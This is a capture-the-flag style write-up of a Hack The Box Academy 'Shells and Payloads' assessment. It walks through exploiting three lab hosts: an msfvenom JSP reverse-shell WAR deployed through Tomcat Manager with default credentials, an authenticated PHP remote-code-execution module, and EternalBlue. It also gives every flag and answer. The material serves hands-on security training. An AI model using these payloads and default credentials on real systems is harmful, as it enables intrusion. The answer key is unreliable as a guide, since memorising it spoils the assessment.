# HTB Academy — Module 08: Shells and Payloads — Skills Assessment

| Field | Details |
|---|---|
| **Platform** | Hack The Box Academy |
| **Module** | 08 — Shells and Payloads |
| **Lab** | Skills Assessment — The Live Engagement |
| **Difficulty** | Medium |
| **Jump Host** | 10.129.56.215 (skills-foothold, 172.16.1.5 internal) |
| **Host-1** | 172.16.1.11 — Windows (status.inlanefreight.local) |
| **Host-2** | 172.16.1.12 — Linux (blog.inlanefreight.local) |
| **Host-3** | 172.16.1.13 — Windows Server 2016 |
| **Date** | April 2026 |

---

## Assessment Overview

A multi-host live engagement accessed through a Linux jump host via RDP. Three targets are reachable from the jump host's internal network segment (172.16.1.x). Each host requires a different exploitation approach — WAR file upload to Tomcat, authenticated PHP RCE via a blog vulnerability, and EternalBlue via SMB. All seven questions are answered in sequence.

---

## Assessment Chain Summary

```
xfreerdp → jump host (skills-foothold, 172.16.1.5)

Host-1 (172.16.1.11):
  nmap → Tomcat 10.0.11 on port 8080, RDP on 3389
  hostname from rdp-ntlm-info → shells-winsvr (Q1)
  msfvenom WAR → Tomcat Manager upload → nc reverse shell
  dir C:\Shares\ → dev-share (Q2)

Host-2 (172.16.1.12):
  nmap → OpenSSH 8.2p1 Ubuntu (Q3: ubuntu)
  searchsploit 50064.rb → php/meterpreter/bind_tcp (Q4: php)
  msfconsole → 50064 → admin:admin123!@# → Meterpreter
  cat /customscripts/flag.txt → B1nD_Shells_r_cool (Q5)

Host-3 (172.16.1.13):
  nmap → SMB 445, hostname SHELLS-WINBLUE (Q6)
  ms17_010_psexec → SYSTEM Meterpreter
  cat C:/Users/Administrator/Desktop/Skills-flag.txt → One-H0st-Down! (Q7)
```

---

## Setup — Connect to Jump Host via RDP

All commands originate from the spawned Academy instance, then pivot through the jump host into the internal 172.16.1.0/23 network.

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.56.215 /u:htb-student /p:HTB_@cademy_stdnt!
```

A full Linux desktop opens as htb-student on skills-foothold. All subsequent commands in this writeup run inside a terminal on this jump host unless otherwise noted.

**Get the jump host's internal IP — needed for LHOST in all payloads:**

```bash
htb-student@skills-foothold:~$ ip a | grep "172.16.1.*"
    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
```

Jump host internal IP: **172.16.1.5** — used as LHOST for all reverse shell payloads.

---

## Question 1 — Hostname of Host-1

**Question:** What is the hostname of Host-1? (answer in all lowercase)

Run a full Nmap scan against Host-1:

```bash
htb-student@skills-foothold:~$ nmap -A 172.16.1.11
```

**Output (relevant section):**
```
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.065s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=shells-winsvr
| rdp-ntlm-info:
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012
```

The `rdp-ntlm-info` script extracts the hostname directly from the RDP NTLM handshake without requiring authentication. The `DNS_Computer_Name` field confirms the hostname.

**Answer: `shells-winsvr`**

---

## Question 2 — Folder in C:\Shares\

**Question:** Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\

Service identified: Apache Tomcat 10.0.11 on port 8080. Tomcat's Manager application allows authenticated deployment of `.WAR` files — a WAR (Web Application Archive) containing a JSP reverse shell payload executes server-side when accessed.

### Step 1 — Start Netcat Listener on Jump Host

```bash
htb-student@skills-foothold:~$ nc -nvlp 9001
listening on [any] 9001 ...
```

### Step 2 — Generate JSP Reverse Shell WAR Payload

```bash
htb-student@skills-foothold:~$ msfvenom -p java/jsp_shell_reverse_tcp \
LHOST=172.16.1.5 LPORT=9001 \
-f war -o managerUpdated.war
```

**Output:**
```
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: managerUpdated.war
```

| Option | Value | Purpose |
|---|---|---|
| `-p java/jsp_shell_reverse_tcp` | JSP reverse shell | Executes inside Tomcat's Java runtime |
| `LHOST=172.16.1.5` | Jump host internal IP | Target calls back to this address |
| `LPORT=9001` | Listener port | Matches the nc listener |
| `-f war` | WAR format | Required for Tomcat Manager deployment |

### Step 3 — Upload and Deploy via Tomcat Manager

From a Firefox browser on the jump host, navigate to `http://172.16.1.11:8080`, click **Manager App**, and authenticate with `tomcat:Tomcatadm` (provided in the module hint).

Scroll to the **WAR file to deploy** section, upload `managerUpdated.war`, and click **Deploy**. The application appears in the application list as `/managerUpdated`. Clicking it triggers the JSP payload — the reverse shell calls back to the listener.

### Step 4 — Catch Shell and Enumerate

```
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49799
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
```

Shell received. Enumerate the Shares directory:

```cmd
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0> dir C:\Shares\
```

**Output:**
```
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  12:22 PM    <DIR>          .
09/22/2021  12:22 PM    <DIR>          ..
09/22/2021  12:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,669,289,472 bytes free
```

**Answer: `dev-share`**

---

## Question 3 — Linux Distribution on Host-2

**Question:** What distribution of Linux is running on Host-2?

The jump host's `/etc/hosts` already maps Host-2:

```bash
htb-student@skills-foothold:~$ cat /etc/hosts
172.16.1.12  blog.inlanefreight.local
```

Run Nmap using the hostname:

```bash
htb-student@skills-foothold:~$ nmap -A blog.inlanefreight.local
```

**Output (relevant section):**
```
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH's banner includes the distribution name in its version string — `Ubuntu 4ubuntu0.3` confirms the build is Ubuntu. Apache's server header corroborates: `Apache/2.4.41 (Ubuntu)`.

**Answer: `ubuntu`**

---

## Question 4 — Language of the 50064.rb Shell

**Question:** What language is the shell written in that gets uploaded when using the 50064.rb exploit?

```bash
htb-student@skills-foothold:~$ searchsploit 50064.rb
```

**Output:**
```
-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
Lightweight facebook-styled blog 1.3  | php/webapps/50064.rb
-------------------------------------- ---------------------------------
```

The path `php/webapps/` already indicates the target language. Confirming with a grep on the exploit's DefaultOptions:

```bash
htb-student@skills-foothold:~$ grep "DefaultOptions" /usr/share/exploitdb/exploits/php/webapps/50064.rb
      'DefaultOptions'  =>
              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
```

The exploit deploys a PHP Meterpreter bind shell — `php/meterpreter/bind_tcp` — confirming PHP is the uploaded shell language.

**Answer: `php`**

---

## Question 5 — Flag on Host-2

**Question:** Exploit the blog site and establish a shell session. Submit the contents of /customscripts/flag.txt

Context: The blog at `blog.inlanefreight.local` runs "Lightweight facebook-styled blog 1.3" which is vulnerable to authenticated RCE via the 50064.rb exploit. Credentials `admin:admin123!@#` are provided in the module hint.

### Step 1 — Load and Configure the Exploit

```bash
htb-student@skills-foothold:~$ msfconsole -q

msf6 > use 50064.rb
[*] Using configured payload php/meterpreter/bind_tcp

msf6 exploit(50064) > set VHOST blog.inlanefreight.local
msf6 exploit(50064) > set RHOSTS 172.16.1.12
msf6 exploit(50064) > set RHOST 172.16.1.12
msf6 exploit(50064) > set USERNAME admin
msf6 exploit(50064) > set PASSWORD admin123!@#
```

**Why both RHOSTS and RHOST:** Some modules require one or the other — setting both ensures the module resolves the target regardless of which it reads internally.

**Why VHOST is required:** The web server uses virtual hosting. Without the correct Host header, the application returns a different response and the exploit fails to authenticate.

### Step 2 — Run the Exploit

```bash
msf6 exploit(50064) > exploit
```

**Output:**
```
[*] Got CSRF token: de5286279a
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4zDx.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444)

meterpreter >
```

The exploit: authenticates to the blog, uploads a PHP shell via the image upload function, then triggers it — opening a bind TCP connection back to the Metasploit handler.

### Step 3 — Read the Flag

```
meterpreter > cat /customscripts/flag.txt
B1nD_Shells_r_cool
```

**Answer: `B1nD_Shells_r_cool`**

---

## Question 6 — Hostname of Host-3

**Question:** What is the hostname of Host-3? (answer in all lowercase)

```bash
htb-student@skills-foothold:~$ nmap -A 172.16.1.13
```

**Output (relevant section):**
```
Nmap scan report for 172.16.1.13
Host is up (0.069s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINBLUE
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
```

The `nbstat` script reads the NetBIOS name broadcast by the machine. The `smb-os-discovery` script confirms the computer name via SMB negotiation. Both return `SHELLS-WINBLUE`.

SMB signing is disabled — and the hostname "WINBLUE" is a deliberate hint pointing directly to EternalBlue (MS17-010).

**Answer: `shells-winblue`**

---

## Question 7 — Flag on Host-3

**Question:** Exploit and gain a shell session with Host-3. Submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

Target: Windows Server 2016, SMB open (139/445), SMB signing disabled. EternalBlue (MS17-010) exploits a memory corruption vulnerability in SMBv1's handling of transaction requests, resulting in SYSTEM-level code execution without credentials.

### Step 1 — Load and Configure the Module

```bash
htb-student@skills-foothold:~$ msfconsole -q

msf6 > use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 172.16.1.5
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.13
```

**Why ms17_010_psexec over ms17_010_eternalblue:** The psexec variant is more stable on newer Windows versions (Server 2016 and above). The base EternalBlue module can cause BSODs on patched-but-still-vulnerable systems. The psexec variant uses the memory write primitive to execute a service binary instead.

### Step 2 — Run the Exploit

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

**Output:**
```
[*] Started reverse TCP handler on 172.16.1.5:4444
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671)

meterpreter >
```

SYSTEM session obtained — EternalBlue gives SYSTEM directly, no privilege escalation required.

### Step 3 — Read the Flag

```
meterpreter > cat C:/Users/Administrator/Desktop/Skills-flag.txt
One-H0st-Down!
```

**Answer: `One-H0st-Down!`**

---

## Lessons Learned

The jump host architecture was a new operational context compared to single-target labs. All payloads required LHOST set to the jump host's internal interface IP (172.16.1.5) rather than the VPN IP — because the targets are on a private segment that can reach the jump host but cannot reach the HTB VPN directly. Identifying the correct interface with `ip a | grep "172.16.1.*"` before generating any payload is a mandatory first step in pivoted environments.

The WAR file delivery via Tomcat Manager is one of the cleanest initial access techniques on Windows when Tomcat is exposed. The Tomcat Manager requires authentication, but `tomcat:Tomcatadm` and `admin:admin` are the two default credential pairs that get tested on every Tomcat instance. The WAR format packages the JSP payload in a way that Tomcat deploys it as a full application — clicking the deployed app in the Manager interface is what triggers execution.

The 50064.rb exploit flow reinforced that VHOST is not optional when virtual hosting is in use. The blog site returns a completely different response if the Host header does not match `blog.inlanefreight.local` — authentication would fail silently and the shell would never upload. Setting VHOST tells the Metasploit module to include the correct Host header in every request.

EternalBlue on Windows Server 2016 confirmed that the psexec variant is the right choice over the base exploit for modern targets. The `ms17_010_psexec` module uses the arbitrary write primitive to stage a PowerShell-based payload rather than attempting to overwrite kernel pool memory for shellcode execution — substantially more reliable on newer Windows builds.

---

## Answers Summary

| Question | Target | Technique | Answer |
|---|---|---|---|
| Q1 — Hostname of Host-1 | 172.16.1.11 | Nmap rdp-ntlm-info | shells-winsvr |
| Q2 — Folder in C:\Shares\ | 172.16.1.11 | MSFVenom WAR → Tomcat Manager | dev-share |
| Q3 — Linux distro on Host-2 | 172.16.1.12 | Nmap SSH/HTTP banner | ubuntu |
| Q4 — Shell language in 50064.rb | — | searchsploit + grep DefaultOptions | php |
| Q5 — /customscripts/flag.txt | 172.16.1.12 | Metasploit 50064 PHP RCE | B1nD_Shells_r_cool |
| Q6 — Hostname of Host-3 | 172.16.1.13 | Nmap nbstat + smb-os-discovery | shells-winblue |
| Q7 — Administrator Desktop flag | 172.16.1.13 | EternalBlue ms17_010_psexec | One-H0st-Down! |

---

## Full Attack Chain Reference

```
1.  xfreerdp /v:10.129.56.215 /u:htb-student /p:HTB_@cademy_stdnt!
    → Jump host desktop (skills-foothold)

2.  ip a | grep "172.16.1.*"
    → 172.16.1.5 (ens224) — LHOST for all payloads

3.  nmap -A 172.16.1.11
    → Tomcat 10.0.11 (8080), RDP (3389), hostname: shells-winsvr ✅ Q1

4.  nc -nvlp 9001
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o managerUpdated.war
    Firefox → http://172.16.1.11:8080 → Manager App → tomcat:Tomcatadm → deploy WAR
    → shell as Tomcat service account
    dir C:\Shares\ → dev-share ✅ Q2

5.  nmap -A blog.inlanefreight.local
    → OpenSSH 8.2p1 Ubuntu → ubuntu ✅ Q3

6.  searchsploit 50064.rb + grep DefaultOptions
    → php/meterpreter/bind_tcp → php ✅ Q4

7.  msfconsole → use 50064.rb
    set VHOST blog.inlanefreight.local, RHOSTS/RHOST=172.16.1.12
    set USERNAME admin, PASSWORD admin123!@#
    exploit → Meterpreter session
    cat /customscripts/flag.txt → B1nD_Shells_r_cool ✅ Q5

8.  nmap -A 172.16.1.13
    → SMB 445, Windows Server 2016, SHELLS-WINBLUE → shells-winblue ✅ Q6

9.  msfconsole → use exploit/windows/smb/ms17_010_psexec
    set LHOST 172.16.1.5, RHOSTS 172.16.1.13
    exploit → SYSTEM Meterpreter
    cat C:/Users/Administrator/Desktop/Skills-flag.txt → One-H0st-Down! ✅ Q7
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `xfreerdp /v:<IP> /u:htb-student /p:HTB_@cademy_stdnt!` | Connect to jump host via RDP |
| `ip a \| grep "172.16.1.*"` | Find jump host's internal IP for LHOST |
| `nmap -A <IP>` | Full scan — OS, version, scripts |
| `nc -nvlp 9001` | Start Netcat listener on jump host |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=9001 -f war -o shell.war` | Generate JSP reverse shell WAR |
| `firefox http://172.16.1.11:8080` | Open Tomcat Manager in browser |
| `dir C:\Shares\` | List Windows Shares directory |
| `searchsploit 50064.rb` | Search for Lightweight blog exploit |
| `grep "DefaultOptions" 50064.rb` | Confirm shell language in exploit |
| `use 50064.rb` | Load Metasploit blog RCE module |
| `set VHOST blog.inlanefreight.local` | Set virtual host header for blog exploit |
| `cat /customscripts/flag.txt` | Read Linux flag via Meterpreter |
| `use exploit/windows/smb/ms17_010_psexec` | Load EternalBlue psexec variant |
| `cat C:/Users/Administrator/Desktop/Skills-flag.txt` | Read Windows flag via Meterpreter |
